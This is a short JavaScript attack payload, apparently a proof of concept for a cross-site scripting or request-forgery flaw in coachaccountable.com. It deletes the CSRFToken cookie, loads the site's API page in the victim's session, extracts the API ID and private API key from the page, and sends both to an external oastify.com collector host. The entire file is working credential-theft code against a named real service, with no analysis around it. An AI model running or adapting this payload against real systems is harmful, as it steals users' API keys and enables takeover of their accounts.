// Function to delete the CSRFToken cookie
function deleteCookie(name) {
  document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
}

// Delete the CSRFToken cookie
deleteCookie("CSRFToken");

// Function to send extracted data to the external server via GET request
function sendData(apiId, apiKey) {
  // Construct the URL properly with only the actual values (not the entire HTML)
  const url = `https://lj8xnmcmaivpwy0jmm1mnhyqnht8h25r.oastify.com/?apiId=${encodeURIComponent(apiId)}&apiKey=${encodeURIComponent(apiKey)}`;
  fetch(url);
}

// Send the GET request and process the response
fetch("https://www.coachaccountable.com/AJAX?page=API")
  .then(response => response.text())
  .then(html => {
    // Parse the response to extract API ID and Private API Key
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");

    // Extract the correct API ID and API Key values from the .embedCode divs
    const apiId = doc.querySelectorAll(".embedCode")[1].textContent.trim();  // API ID is in the second .embedCode div
    const apiKey = doc.getElementById("APIKeyDiv").textContent.trim();        // API Key is in the div with ID 'APIKeyDiv'

    // Send the extracted data
    sendData(apiId, apiKey);
  })
  .catch(error => console.error("Error:", error));
